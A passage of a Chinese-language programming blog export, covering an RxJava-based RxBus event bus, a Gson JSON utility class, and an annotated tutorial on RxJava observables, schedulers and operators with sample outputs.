抽象类：继承 Observable 类并实现 Observer 接口，即同时充当被观察者和观察者，可以当作一个事件管道，一端输入，一端输出。 PublishSubject：观察者只能收到订阅之后被观察者所发送的事件。 之后 ReplaySubject：观察者能够收到订阅之前被观察者所发送的所有事件。 之前 + 之后 BehaviorSubject：观察者能够收到订阅之前被观察者所发送的最后一个事件。 1 + 之后 AsyncSubject：观察者只能收到被观察者结束后所发送的最后一个事件。 1 SerializedSubject：用于把 Subject 对象包装成线程安全的 Subject。 RxBus.java - v0.1 import android.support.annotation.NonNull; import rx.Observable; import rx.subjects.PublishSubject; import rx.subjects.SerializedSubject; import rx.subjects.Subject; import java.util.ArrayList; import java.util.List; import java.util.concurrent.ConcurrentHashMap; public class RxBus { private static final RxBus INSTANCE = new RxBus(); private final ConcurrentHashMap\u0026lt;Object, List\u0026lt;Subject\u0026gt;\u0026gt; mSubjectMap = new ConcurrentHashMap\u0026lt;\u0026gt;(); private RxBus() { } public static RxBus getInstance() { return INSTANCE; } public \u0026lt;T\u0026gt; Observable\u0026lt;T\u0026gt; register(@NonNull Object tag, @NonNull Class\u0026lt;T\u0026gt; classOfT) { List\u0026lt;Subject\u0026gt; subjectList = mSubjectMap.get(tag); if (null == subjectList) { subjectList = new ArrayList\u0026lt;\u0026gt;(); mSubjectMap.put(tag, subjectList); } Subject\u0026lt;T, T\u0026gt; subject = new SerializedSubject\u0026lt;\u0026gt;(PublishSubject.create()); subjectList.add(subject); return subject; } public void unRegister(@NonNull Object tag, @NonNull Observable observable) { List\u0026lt;Subject\u0026gt; subjectList = mSubjectMap.get(tag); if (null != subjectList) { if (subjectList.contains(((Subject) observable))) { subjectList.remove((Subject) observable); } if (subjectList.isEmpty()) { mSubjectMap.remove(tag); } } } @SuppressWarnings(\u0026#34;unchecked\u0026#34;) public void post(@NonNull Object tag, @NonNull Object content) { List\u0026lt;Subject\u0026gt; subjectList = mSubjectMap.get(tag); if (null != subjectList) { for (Subject subject : subjectList) { subject.onNext(content); } } } } RxBus.java - v0.2 import android.support.annotation.NonNull; import rx.Observable; import rx.subjects.PublishSubject; import rx.subjects.SerializedSubject; import rx.subjects.Subject; public class RxBus { private static final RxBus INSTANCE = new RxBus(); 单例模式（饿汉方式） private final Subject\u0026lt;Object, Object\u0026gt; mBus = new SerializedSubject\u0026lt;\u0026gt;(PublishSubject.create()); 事件总线（PublishSubject） private RxBus() { 私有构造方法 } public static RxBus getInstance() { 获得实例 return INSTANCE; } public \u0026lt;T\u0026gt; Observable\u0026lt;T\u0026gt; toObservable(@NonNull Class\u0026lt;T\u0026gt; classOfT) { 转为 Observable return mBus.ofType(classOfT); 过滤掉类型不匹配的事件（ofType = filter + cast），防止 ClassCastException } public void post(@NonNull Object o) { 发送事件 mBus.onNext(o); } } MessageEvent.java public class MessageEvent { POJO（plain old Java object） public final int mId; public final String mMsg; public MessageEvent(int id, String msg) { mId = id; mMsg = msg; } } 实例 public class MainActivity extends Activity { private final CompositeSubscription mCompositeSubscription = new CompositeSubscription(); Subscription 集合 @Override protected void onCreate(Bundle savedInstanceState) { super.onCreate(savedInstanceState); ActivityMainBinding activityMainBinding = DataBindingUtil.setContentView(this, R.layout.activity_main); Subscription subscribe1 = RxView.clicks(activityMainBinding.button) 绑定控件的单击事件 .doOnUnsubscribe(() -\u0026gt; Log.w(\u0026#34;Tag\u0026#34;, \u0026#34;取消绑定1\u0026#34;)) 取消订阅时回调 .subscribe( aVoid -\u0026gt; { 处理单击 Log.w(\u0026#34;Tag\u0026#34;, \u0026#34;单击\u0026#34;); RxBus.getInstance().post(\u0026#34;单击_String\u0026#34;); 发送事件（发送 String） }, error -\u0026gt; Log.w(\u0026#34;Tag\u0026#34;, error.toString()), 出现异常 () -\u0026gt; Log.w(\u0026#34;Tag\u0026#34;, \u0026#34;onComplete\u0026#34;)); 完成事件 Subscription subscribe2 = RxView.longClicks(activityMainBinding.button) 绑定控件的长按事件 .doOnUnsubscribe(() -\u0026gt; Log.w(\u0026#34;Tag\u0026#34;, \u0026#34;取消绑定2\u0026#34;)) 取消订阅时回调 .subscribe( aVoid -\u0026gt; { 处理长按 Log.w(\u0026#34;Tag\u0026#34;, \u0026#34;长按\u0026#34;); RxBus.getInstance().post(new MessageEvent(123, \u0026#34;长按_MessageEvent\u0026#34;)); 发送事件（发送 MessageEvent） }, error -\u0026gt; Log.w(\u0026#34;Tag\u0026#34;, error.toString()), 出现异常 () -\u0026gt; Log.w(\u0026#34;Tag\u0026#34;, \u0026#34;onComplete\u0026#34;)); 完成事件 Subscription subscribe3 = RxBus.getInstance().toObservable(String.class) 订阅事件（类型为 String） .doOnUnsubscribe(() -\u0026gt; Log.w(\u0026#34;Tag\u0026#34;, \u0026#34;取消订阅1\u0026#34;)) 取消订阅时回调 .subscribe( s -\u0026gt; Log.w(\u0026#34;Tag\u0026#34;, s), 处理事件 error -\u0026gt; Log.w(\u0026#34;Tag\u0026#34;, error.toString()), 出现异常 () -\u0026gt; Log.w(\u0026#34;Tag\u0026#34;, \u0026#34;onComplete\u0026#34;)); 完成事件 Subscription subscribe4 = RxBus.getInstance().toObservable(MessageEvent.class) 订阅事件（类型为 MessageEvent） .doOnUnsubscribe(() -\u0026gt; Log.w(\u0026#34;Tag\u0026#34;, \u0026#34;取消订阅2\u0026#34;)) 取消订阅时回调 .subscribe( messageEvent -\u0026gt; Log.w(\u0026#34;Tag\u0026#34;, String.format(\u0026#34;%s_%d\u0026#34;, messageEvent.mMsg, messageEvent.mId)), 处理事件 error -\u0026gt; Log.w(\u0026#34;Tag\u0026#34;, error.toString()), 出现异常 () -\u0026gt; Log.w(\u0026#34;Tag\u0026#34;, \u0026#34;onComplete\u0026#34;)); 完成事件 mCompositeSubscription.addAll(subscribe1, subscribe2, subscribe3, subscribe4); 集中管理 Subscription } @Override protected void onDestroy() { super.onDestroy(); mCompositeSubscription.clear(); 取消订阅并清空集合中的所有 Subscription，避免内存泄漏 } } ---- 输出： 12782-12782/com.example.myapp.myapplication W/Tag: 单击 12782-12782/com.example.myapp.myapplication W/Tag: 单击_String 12782-12782/com.example.myapp.myapplication W/Tag: 长按 12782-12782/com.example.myapp.myapplication W/Tag: 长按_MessageEvent_123 12782-12782/com.example.myapp.myapplication W/Tag: 取消订阅2 12782-12782/com.example.myapp.myapplication W/Tag: 取消订阅1 12782-12782/com.example.myapp.myapplication W/Tag: 取消绑定2 12782-12782/com.example.myapp.myapplication W/Tag: 取消绑定1 ","permalink":"https://xhstormr.github.io/blog/posts/android-rxbus/","summary":"","title":"RxBus"},{"content":"Updated on 2016-11-19\nhttps://github.com/google/gson\nJsonUtil.java import com.google.gson.Gson; import com.google.gson.JsonArray; import com.google.gson.JsonParser; import java.util.ArrayList; import java.util.List; public class JsonUtil { private static Gson mGson = new Gson(); 单例模式 public static \u0026lt;T\u0026gt; String objectToString(T object) { 对象，List ➜ String return mGson.toJson(object); } public static \u0026lt;T\u0026gt; T stringToObject(String json, Class\u0026lt;T\u0026gt; classOfT) { String ➜ 对象 return mGson.fromJson(json, classOfT); } public static \u0026lt;T\u0026gt; List\u0026lt;T\u0026gt; stringToList(String json, Class\u0026lt;T\u0026gt; classOfT) { String ➜ List List\u0026lt;T\u0026gt; list = new ArrayList\u0026lt;\u0026gt;(); JsonArray jsonArray = new JsonParser().parse(json).getAsJsonArray(); jsonArray.forEach(jsonElement -\u0026gt; list.add(mGson.fromJson(jsonElement, classOfT))); return list; } } Test.java import java.util.Arrays; import java.util.List; public class Test { public static void main(String[] args) { People people = new People(\u0026#34;ABC\u0026#34;, 25); List\u0026lt;People\u0026gt; peoples = Arrays.asList(people, people, people); String s1 = JsonUtil.objectToString(people); String s2 = JsonUtil.objectToString(peoples); People p1 = JsonUtil.stringToObject(s1, People.class); List\u0026lt;People\u0026gt; p2 = JsonUtil.stringToList(s2, People.class); System.out.println(s1); System.out.println(s2); System.out.println(p1); System.out.println(p2); } private static class People { private String name; private int age; private People(String name, int age) { this.name = name; this.age = age; } @Override public String toString() { return \u0026#34;People{\u0026#34; + \u0026#34;name=\u0026#39;\u0026#34; + name + \u0026#39;\\\u0026#39;\u0026#39; + \u0026#34;, age=\u0026#34; + age + \u0026#39;}\u0026#39;; } } } ---- 输出： {\u0026#34;name\u0026#34;:\u0026#34;ABC\u0026#34;,\u0026#34;age\u0026#34;:25} [{\u0026#34;name\u0026#34;:\u0026#34;ABC\u0026#34;,\u0026#34;age\u0026#34;:25},{\u0026#34;name\u0026#34;:\u0026#34;ABC\u0026#34;,\u0026#34;age\u0026#34;:25},{\u0026#34;name\u0026#34;:\u0026#34;ABC\u0026#34;,\u0026#34;age\u0026#34;:25}] People{name=\u0026#39;ABC\u0026#39;, age=25} [People{name=\u0026#39;ABC\u0026#39;, age=25}, People{name=\u0026#39;ABC\u0026#39;, age=25}, People{name=\u0026#39;ABC\u0026#39;, age=25}] ","permalink":"https://xhstormr.github.io/blog/posts/android-jsonutil/","summary":"","title":"JsonUtil"},{"content":"Updated on 2016-11-22\n观察者模式\n响应式编程 | 函数式编程\nhttps://github.com/ReactiveX/RxJava\nhttp://reactivex.io/RxJava/2.x/javadoc/io/reactivex/Observable.html\nOperators | Operators\nBook | Book\nJava Native import java.util.Observable; import java.util.Observer; public class Main { public static void main(String[] args) { Subject subject = new Subject(); Consumer consumer = new Consumer(); subject.addObserver(consumer); // 被观察者添加观察者 subject.setData(\u0026#34;123\u0026#34;); subject.setData(\u0026#34;123\u0026#34;); subject.setData(\u0026#34;456\u0026#34;); subject.setData(\u0026#34;456\u0026#34;); } private static class Subject extends Observable { // 被观察者需要继承类 private String data = \u0026#34;\u0026#34;; public String getData() { return data; } public void setData(String data) { if (data == null || this.data.equals(data)) return; // 过滤无效数据 this.data = data; setChanged(); // 设置 flag notifyObservers(data); // 通知观察者 } } private static class Consumer implements Observer { // 观察者需要实现接口 @Override public void update(Observable o, Object arg) { System.out.println(\u0026#34;Update: \u0026#34; + arg); } } } ---- 输出： Update: 123 Update: 456 Observable - 被观察者 Observable\u0026lt;String\u0026gt; observable = Observable.create(new Observable.OnSubscribe\u0026lt;String\u0026gt;() { 传入 OnSubscribe，描述事件 @Override public void call(Subscriber\u0026lt;? super String\u0026gt; subscriber) { 作为参数传入的观察者 subscriber.onNext(\u0026#34;A\u0026#34;); 事件 subscriber.onNext(\u0026#34;B\u0026#34;); subscriber.onNext(\u0026#34;C\u0026#34;); subscriber.onCompleted(); } }); ---- Observable\u0026lt;String\u0026gt; observable = Observable.create(subscriber -\u0026gt; { 简化为 Lambda 表达式 subscriber.onNext(\u0026#34;A\u0026#34;); subscriber.onNext(\u0026#34;B\u0026#34;); subscriber.onNext(\u0026#34;C\u0026#34;); subscriber.onCompleted(); }); ------------------------------------------------------- Observable\u0026lt;String\u0026gt; observable = Observable.just(\u0026#34;A\u0026#34;, \u0026#34;B\u0026#34;, \u0026#34;C\u0026#34;); 快捷方式 ------------------------------------------------------- List\u0026lt;String\u0026gt; list = Arrays.asList(\u0026#34;A\u0026#34;, \u0026#34;B\u0026#34;, \u0026#34;C\u0026#34;); Observable\u0026lt;String\u0026gt; observable = Observable.from(list); 快捷方式 ------------------------------------------------------- observable.subscribe(observer); 被观察者订阅观察者（观察者见下文） ---- 输出： A B C onCompleted Note： 0. 被观察者发出事件，观察者处理事件。（可一对多） 1. 一旦被观察者调用 subscribe() 方法订阅观察者，被观察者中的唯一成员 OnSubscribe 将执行 call() 方法并将观察者作为参数传入。 2. 调用 subscribe() 方法后会返回 Subscription 接口对象（仅含 2 个方法 unsubscribe 和 isUnsubscribed），代表被观察者与观察者之间的订阅关系。 Observer - 观察者 Observer\u0026lt;String\u0026gt; observer = new Observer\u0026lt;String\u0026gt;() { 接口（最终会被包装为 Subscriber） @Override public void onCompleted() { 完成事件（调用链结束） System.out.println(\u0026#34;onCompleted\u0026#34;); } @Override public void onError(Throwable e) { 出现异常，框架自动调用（调用链结束） System.out.println(\u0026#34;onError\u0026#34;); } @Override public void onNext(String s) { 处理事件 System.out.println(s); } }; ------------------------------------------------------- Subscriber\u0026lt;String\u0026gt; subscriber = new Subscriber\u0026lt;String\u0026gt;() { 抽象类（继承但未实现 Observer 接口，且可选择性重写 onStart 方法） @Override public void onCompleted() { 完成事件（调用链结束） System.out.println(\u0026#34;onCompleted\u0026#34;); } @Override public void onError(Throwable e) { 出现异常，框架自动调用（调用链结束） System.out.println(\u0026#34;onError\u0026#34;); } @Override public void onNext(String s) { 处理事件 System.out.println(s); } }; 调用链：onStart() --\u0026gt; onNext() --\u0026gt; onCompleted() | | ↳ onError() | ↳ 此方法只能在调用 subscribe() 的线程上执行，可通过操作符 doOnSubscribe(Action0) 替代且可指定运行线程 ↳ 当调用链结束后，订阅关系自动解除（Subscription.isUnsubscribed = true） ------------------------------------------------------- Action1\u0026lt;String\u0026gt; action1 = new Action1\u0026lt;String\u0026gt;() { 快捷方式（被观察者的 subscribe() 方法支持传入 Action1 接口充当 onNext） @Override public void call(String s) { System.out.println(s); } }; ---- Action1\u0026lt;String\u0026gt; action1 = s -\u0026gt; System.out.println(s); 简化为 Lambda 表达式 Action1\u0026lt;String\u0026gt; action1 = System.out::println; 简化为方法引用 Scheduler - 线程调度 默认情况下调用链（事件流）在调用 subscribe() 的线程上运行，可以通过以下 2 种方法指定运行线程：\n（一次）subscribeOn()：指定其运行线程。 （多次）observeOn()：切换其运行线程。 subscribeOn() 用于指定最开始调用链（事件流）的运行线程，后期可通过 observeOn() 随时切换其运行线程。 Observable .create((Observable.OnSubscribe\u0026lt;String\u0026gt;) subscriber -\u0026gt; { Log.w(\u0026#34;Tag\u0026#34;, \u0026#34;create__\u0026#34; + Thread.currentThread().toString()); subscriber.onNext(\u0026#34;\u0026#34;); subscriber.onCompleted(); }) .observeOn(Schedulers.computation()) 切换至计算线程 (2) .map(s -\u0026gt; { Log.w(\u0026#34;Tag\u0026#34;, \u0026#34;map__\u0026#34; + Thread.currentThread().toString()); return s; }) .observeOn(AndroidSchedulers.mainThread()) 切换至主线程 (3) .subscribeOn(Schedulers.io()) 指定最开始在IO线程中运行 (1) .subscribe(new Subscriber\u0026lt;String\u0026gt;() { @Override public void onCompleted() { Log.w(\u0026#34;Tag\u0026#34;, \u0026#34;onCompleted__\u0026#34; + Thread.currentThread().toString()); } @Override public void onError(Throwable e) { Log.w(\u0026#34;Tag\u0026#34;, \u0026#34;onError\u0026#34;); } @Override public void onNext(String s) { Log.w(\u0026#34;Tag\u0026#34;, \u0026#34;onNext__\u0026#34; + Thread.currentThread().toString()); } }); ---- 输出： 23701-14945/com.example.myapp.myapplication W/Tag: create__Thread[RxIoScheduler-3,5,main] IO 线程 23701-23824/com.example.myapp.myapplication W/Tag: map__Thread[RxComputationScheduler-2,5,main] 计算线程 23701-23701/com.example.myapp.myapplication W/Tag: onNext__Thread[main,5,main] 主线程 23701-23701/com.example.myapp.myapplication W/Tag: onCompleted__Thread[main,5,main] 主线程 ------------------------------------------------------- 实例：加载网络图片 ---- Observable .just(\u0026#34;http://blog.xhstormr.tk/uploads/children-of-the-sun1.jpg\u0026#34;) .map(s -\u0026gt; { 下载 Bitmap（String ➜ Bitmap） Bitmap bitmap = null; try (BufferedInputStream bufferedInputStream = new BufferedInputStream(new URL(s).openStream())) { bitmap = BitmapFactory.decodeStream(bufferedInputStream); } catch (IOException e) { e.printStackTrace(); } return bitmap; }) .observeOn(AndroidSchedulers.mainThread()) 切换至主线程 (2) .subscribeOn(Schedulers.io()) 指定最开始在IO线程中运行 (1) .subscribe(bitmap -\u0026gt; mImageView.setImageBitmap(bitmap)); 加载 Bitmap Operators - 操作符 类似于 Java 8 中的 Stream 的内部迭代。\n转换 public class A { private static final List\u0026lt;Author\u0026gt; LIST = Arrays.asList( new Author(\u0026#34;Adam\u0026#34;, 23, Arrays.asList(\u0026#34;Java1\u0026#34;, \u0026#34;Java2\u0026#34;)), new Author(\u0026#34;Bell\u0026#34;, 19, Arrays.asList(\u0026#34;Python1\u0026#34;, \u0026#34;Python2\u0026#34;)), new Author(\u0026#34;Conan\u0026#34;, 23, Arrays.asList(\u0026#34;PHP1\u0026#34;, \u0026#34;PHP2\u0026#34;)), new Author(\u0026#34;David\u0026#34;, 26, Arrays.asList(\u0026#34;Ruby1\u0026#34;, \u0026#34;Ruby2\u0026#34;))); 作家列表 public static void main(String[] args) { Observable .from(LIST) .map(author -\u0026gt; author.mAge) 一对一 .sorted() 排序 .subscribe(integer -\u0026gt; System.out.print(integer + \u0026#34; \u0026#34;), System.out::println, () -\u0026gt; System.out.println(\u0026#34;\\n————————————\u0026#34;)); Observable .from(LIST) .map(author -\u0026gt; author.mAge) 一对一 .sorted() 排序 .scan(0, (i1, i2) -\u0026gt; i1 + i2) 累加器，提供初始值 .subscribe(integer -\u0026gt; System.out.print(integer + \u0026#34; \u0026#34;), System.out::println, () -\u0026gt; System.out.println(\u0026#34;\\n————————————\u0026#34;)); Observable .from(LIST) .map(author -\u0026gt; author.mAge) 一对一 .reduce(0, (i1, i2) -\u0026gt; i1 + i2) 累加器，提供初始值 .subscribe(integer -\u0026gt; System.out.print(integer + \u0026#34; \u0026#34;), System.out::println, () -\u0026gt; System.out.println(\u0026#34;\\n————————————\u0026#34;)); Observable .from(LIST) .flatMap(author -\u0026gt; Observable.from(author.mArticle)) 一对多（手动转换为 Observable）（推荐使用 concatMap，解决 flatMap 事件交叉问题）（flatMap() 底层调用 merge()，concatMap 底层调用 concat()，下同） .subscribe(System.out::println, System.out::println, () -\u0026gt; System.out.println(\u0026#34;————————————\u0026#34;)); Observable .from(LIST) .flatMapIterable(author -\u0026gt; author.mArticle) 一对多（自动转换为 Observable）（推荐使用 concatMapIterable，解决 flatMapIterable 事件交叉问题） .subscribe(System.out::println, System.out::println, () -\u0026gt; System.out.println(\u0026#34;————————————\u0026#34;)); Observable .from(LIST) .groupBy(author -\u0026gt; author.mAge) 按年龄将事件流分组 .concatMap(groupedObservable -\u0026gt; groupedObservable) 一对多 .subscribe(author -\u0026gt; System.out.printf(\u0026#34;年龄:%d 姓名:%s\\n\u0026#34;, author.mAge, author.mName), System.out::println, () -\u0026gt; System.out.println(\u0026#34;————————————\u0026#34;)); } private static class Author { 作家 private String mName; 姓名 private int mAge; 年龄 private List\u0026lt;String\u0026gt; mArticle; 文章列表 private Author(String name, int age, List\u0026lt;String\u0026gt; article) { mName = name; mAge = age; mArticle = article; } @Override public String toString() { return mName; } } } ---- 输出： 19 23 23 26 ———————————— 0 19 42 65 91 ———————————— 91 ———————————— Java1 Java2 Python1 Python2 PHP1 PHP2 Ruby1 Ruby2 ———————————— Java1 Java2 Python1 Python2 PHP1 PHP2 Ruby1 Ruby2 ———————————— 年龄:23 姓名:Adam 年龄:23 姓名:Conan 年龄:19 姓名:Bell 年龄:26 姓名:David ———————————— 过滤 public class A { private static final List\u0026lt;Author\u0026gt; LIST = Arrays.asList( new Author(\u0026#34;Adam\u0026#34;, 23, Arrays.asList(\u0026#34;Java1\u0026#34;, \u0026#34;Java2\u0026#34;)), new Author(\u0026#34;Bell\u0026#34;, 19, Arrays.asList(\u0026#34;Python1\u0026#34;, \u0026#34;Python2\u0026#34;)), new Author(\u0026#34;Conan\u0026#34;, 23, Arrays.asList(\u0026#34;PHP1\u0026#34;, \u0026#34;PHP2\u0026#34;)), new Author(\u0026#34;David\u0026#34;, 26, Arrays.asList(\u0026#34;Ruby1\u0026#34;, \u0026#34;Ruby2\u0026#34;))); public static void main(String[] args) { Observable .from(LIST) .filter(author -\u0026gt; author.mAge \u0026gt; 25) 过滤 .subscribe(author -\u0026gt; System.out.printf(\u0026#34;年龄:%d 姓名:%s\\n\u0026#34;, author.mAge, author.mName), System.out::println, () -\u0026gt; System.out.println(\u0026#34;————————————\u0026#34;)); Observable .from(LIST) .take(2) 只取前 2 .subscribe(System.out::println, System.out::println, () -\u0026gt; System.out.println(\u0026#34;————————————\u0026#34;)); Observable .from(LIST) .takeLast(2) 只取后 2 .subscribe(System.out::println, System.out::println, () -\u0026gt; System.out.println(\u0026#34;————————————\u0026#34;)); Observable .from(LIST) .skip(2) 跳过前 2 .subscribe(System.out::println, System.out::println, () -\u0026gt; System.out.println(\u0026#34;————————————\u0026#34;)); Observable .from(LIST) .skipLast(2) 跳过后 2 .subscribe(System.out::println, System.out::println, () -\u0026gt; System.out.println(\u0026#34;————————————\u0026#34;)); Observable .from(LIST) .elementAt(0) 选取 .subscribe(System.out::println, System.out::println, () -\u0026gt; System.out.println(\u0026#34;————————————\u0026#34;)); Observable .from(LIST) .first() 选取最前（若无数据：first() 直接调用 onError()，takeFirst() 直接调用 onCompleted()，下同） .subscribe(System.out::println, System.out::println, () -\u0026gt; System.out.println(\u0026#34;————————————\u0026#34;)); Observable .from(LIST) .last() 选取最后 .subscribe(System.out::println, System.out::println, () -\u0026gt; System.out.println(\u0026#34;————————————\u0026#34;)); Observable .from(Arrays.asList(1, 1, 2, 2, 3, 3, 4, 4, 5, 5, 6, 6, 1, 2, 3, 4, 5, 6)) .distinct() 去重 .subscribe(integer -\u0026gt; System.out.print(integer + \u0026#34; \u0026#34;), System.out::println, () -\u0026gt; System.out.println(\u0026#34;\\n————————————\u0026#34;)); Observable .from(Arrays.asList(1, 1, 2, 2, 3, 3, 4, 4, 5, 5, 6, 6, 1, 2, 3, 4, 5, 6)) .distinctUntilChanged() 前后去重 .subscribe(integer -\u0026gt; System.out.print(integer + \u0026#34; \u0026#34;), System.out::println, () -\u0026gt; System.out.println(\u0026#34;\\n————————————\u0026#34;)); ---- 输出： 年龄:26 姓名:David ———————————— Adam Bell ———————————— Conan David ———————————— Conan David ———————————— Adam Bell ———————————— Adam ———————————— Adam ———————————— David ———————————— 1 2 3 4 5 6 ———————————— 1 2 3 4 5 6 1 2 3 4 5 6 ———————————— } private static void a() throws InterruptedException { takeUntil Observable .from(Arrays.asList(1, 2, 3, 4, 5, 6)) .takeUntil(integer -\u0026gt; integer == 3) 一直处理事件，直到事件符合某项条件 .subscribe(System.out::println); ---- 输出： 1 2 3 Observable\u0026lt;Long\u0026gt; observable1 = Observable.interval(300, TimeUnit.MILLISECONDS); 每隔 300 毫秒发送数字 Observable\u0026lt;Long\u0026gt; observable2 = Observable.interval(800, TimeUnit.MILLISECONDS); 每隔 800 毫秒发送数字 observable1 .takeUntil(observable2) 一直处理事件，直到 observable2 发送了事件 .subscribe(System.out::println, System.out::println, () -\u0026gt; System.exit(0)); Thread.sleep(Integer.MAX_VALUE); ---- 输出： 0 1 } private static class Author { private String mName; private int mAge; private List\u0026lt;String\u0026gt; mArticle; private Author(String name, int age, List\u0026lt;String\u0026gt; article) { mName = name; mAge = age; mArticle = article; } @Override public String toString() { return mName; } } } 组合 public class A { private static String[] strings = {\u0026#34;A\u0026#34;, \u0026#34;B\u0026#34;, \u0026#34;C\u0026#34;, \u0026#34;D\u0026#34;, \u0026#34;E\u0026#34;}; private static Observable\u0026lt;String\u0026gt; observable1 = Observable 每隔 300 毫秒发送事件：A B C D E .interval(300, TimeUnit.MILLISECONDS) .take(strings.length) .map(aLong -\u0026gt; strings[aLong.intValue()]); private static Observable\u0026lt;Long\u0026gt; observable2 = Observable 每隔 500 毫秒发送事件：0 1 2 3 4 5 6 7 8 9 .interval(500, TimeUnit.MILLISECONDS) .take(10); public static void main(String[] args) throws InterruptedException { a(); b(); Thread.sleep(Integer.MAX_VALUE); } private static void a() { 合并 Observable .merge(observable1, observable2) 无序合并（异步进行） .subscribe(o -\u0026gt; System.out.print(o + \u0026#34; \u0026#34;), System.out::println, () -\u0026gt; System.exit(0)); ---- 输出： A 0 B C 1 D E 2 3 4 5 6 7 8 9 Observable .concat(observable1, observable2) 有序合并（同步进行） .subscribe(o -\u0026gt; System.out.print(o + \u0026#34; \u0026#34;), System.out::println, () -\u0026gt; System.exit(0)); ---- 输出： A B C D E 0 1 2 3 4 5 6 7 8 9 observable1 .startWith(Observable.just(\u0026#34;AA\u0026#34;, \u0026#34;BB\u0026#34;, \u0026#34;CC\u0026#34;)) 有序合并（同步进行），底层调用 concat 在其之前插入新事件，接收 Observable 和 Iterable .subscribe(o -\u0026gt; System.out.print(o + \u0026#34; \u0026#34;), System.out::println, () -\u0026gt; System.exit(0)); ---- 输出： AA BB CC A B C D E } private static void b() { 组合 Observable .zip(observable1, observable2, (s, aLong) -\u0026gt; s + aLong) 不可重用 .subscribe(o -\u0026gt; System.out.print(o + \u0026#34; \u0026#34;), System.out::println, () -\u0026gt; System.exit(0)); ---- 输出： A0 B1 C2 D3 E4 Observable .combineLatest(observable1, observable2, (s, aLong) -\u0026gt; s + aLong) 可重用（与最近的事件组合） .subscribe(o -\u0026gt; System.out.print(o + \u0026#34; \u0026#34;), System.out::println, () -\u0026gt; System.exit(0)); ---- 输出： A0 B0 C0 C1 D1 E1 E2 E3 E4 E5 E6 E7 E8 E9 observable1 左事件源 .join( 可重用（事件具有有效期，有点像排列组合） observable2, 右事件源 s -\u0026gt; Observable.timer(10000, TimeUnit.MILLISECONDS), 左事件有效期 aLong -\u0026gt; Observable.timer(0, TimeUnit.MILLISECONDS), 右事件有效期 (s, aLong) -\u0026gt; s + aLong) .subscribe(o -\u0026gt; System.out.print(o + \u0026#34; \u0026#34;), System.out::println, () -\u0026gt; System.exit(0)); ---- 输出： A0 A1 B1 C1 A2 B2 C2 D2 E2 A3 B3 C3 D3 E3 A4 B4 C4 D4 E4 A5 B5 C5 D5 E5 A6 B6 C6 D6 E6 A7 B7 C7 D7 E7 A8 B8 C8 D8 E8 A9 B9 C9 D9 E9 } } Code Observable .just(\u0026#34;A\u0026#34;, \u0026#34;B\u0026#34;, \u0026#34;C\u0026#34;) .doOnNext(s -\u0026gt; System.out.printf(\u0026#34;%s__%s__%s\\n\u0026#34;, s, Thread.currentThread().getName(), \u0026#34;doOnNext\u0026#34;)) 类似于 Java 8 中的 Stream 的 peek .map(s -\u0026gt; { System.out.printf(\u0026#34;%s__%s__%s\\n\u0026#34;, s, Thread.currentThread().getName(), \u0026#34;map\u0026#34;); return s; }) .subscribe(s -\u0026gt; System.out.printf(\u0026#34;%s__%s__%s\\n\u0026#34;, s, Thread.currentThread().getName(), \u0026#34;onNext\u0026#34;), System.out::println, () -\u0026gt; System.exit(0)); Thread.sleep(Integer.MAX_VALUE); ---- 输出： 类似于 Java 8 中的 Stream 的垂直执行，像在流水线依次经过每个操作，并通过短路求值尽可能减少操作次数 A__main__doOnNext A__main__map A__main__onNext B__main__doOnNext B__main__map B__main__onNext C__main__doOnNext C__main__map C__main__onNext ------------------------------------------------------- Observable .just(\u0026#34;A\u0026#34;, \u0026#34;B\u0026#34;, \u0026#34;C\u0026#34;) .doOnNext(s -\u0026gt; System.out.printf(\u0026#34;%s__%s__%s\\n\u0026#34;, s, Thread.currentThread().getName(), \u0026#34;doOnNext\u0026#34;)) .map(s -\u0026gt; { System.out.printf(\u0026#34;%s__%s__%s\\n\u0026#34;, s, Thread.currentThread().getName(), \u0026#34;map\u0026#34;); return s; }) .observeOn(Schedulers.computation()) 切换至计算线程 (2) .subscribeOn(Schedulers.io()) 指定最开始在IO线程中运行 (1) .subscribe(s -\u0026gt; System.out.printf(\u0026#34;%s__%s__%s\\n\u0026#34;, s, Thread.currentThread().getName(), \u0026#34;onNext\u0026#34;), System.out::println, () -\u0026gt; System.exit(0)); Thread.sleep(Integer.MAX_VALUE); ---- 输出： A__RxIoScheduler-2__doOnNext A__RxIoScheduler-2__map B__RxIoScheduler-2__doOnNext B__RxIoScheduler-2__map C__RxIoScheduler-2__doOnNext C__RxIoScheduler-2__map A__RxComputationScheduler-1__onNext B__RxComputationScheduler-1__onNext C__RxComputationScheduler-1__onNext 通过 compose() 操作符重用操作链 ------------------------------------------------------- public class A { public static void main(String[] args) { final Observable.Transformer\u0026lt;String, String\u0026gt; transformer = new Observable.Transformer\u0026lt;String, String\u0026gt;() { @Override public Observable\u0026lt;String\u0026gt; call(Observable\u0026lt;String\u0026gt; stringObservable) { 对传入的原始被观察者进行加工 return stringObservable.doOnUnsubscribe(() -\u0026gt; System.out.println(\u0026#34;Unsubscribed\u0026#34;)).map(s -\u0026gt; s + \u0026#34;1\u0026#34;); } }; Transformer 对象 Observable .just(\u0026#34;A\u0026#34;, \u0026#34;B\u0026#34;, \u0026#34;C\u0026#34;) .compose(transformer) 重用 Transformer .subscribe(System.out::println); Observable .just(\u0026#34;1\u0026#34;, \u0026#34;2\u0026#34;, \u0026#34;3\u0026#34;) .compose(transformer) 重用 Transformer .subscribe(System.out::println); } } ---- 输出： A1 B1 C1 Unsubscribed 11 21 31 Unsubscribed Note： 1. compose() 接收一个 Transformer 接口，此接口继承自 Func1，接收原始 Observable，返回新 Observable。 2. compose() 作用于整个被观察者，flatMap() 作用于每个事件。 ------------------------------------------------------- 实例：改进之前线程调度加载网络图片的例子 ---- public class A { private static final Observable.Transformer\u0026lt;Object, Object\u0026gt; mTransformer = observable -\u0026gt; 单例模式 observable .observeOn(AndroidSchedulers.mainThread()) 切换至主线程 (2) .subscribeOn(Schedulers.io()); 指定最开始在IO线程中运行 (1) @SuppressWarnings(\u0026#34;unchecked\u0026#34;) 压制警告（强制类型转换） public static \u0026lt;T\u0026gt; Observable.Transformer\u0026lt;T, T\u0026gt; applySchedulers() { return ((Observable.Transformer\u0026lt;T, T\u0026gt;) mTransformer); 返回 Transformer 对象（为了不丢失类型信息而强制转换） } } ---- Observable .just(\u0026#34;http://blog.xhstormr.tk/uploads/children-of-the-sun1.jpg\u0026#34;) .map(s -\u0026gt; { 下载 Bitmap（String ➜ Bitmap） Bitmap bitmap = null; try (BufferedInputStream bufferedInputStream = new BufferedInputStream(new URL(s).openStream())) { bitmap = BitmapFactory.decodeStream(bufferedInputStream); } catch (IOException e) { 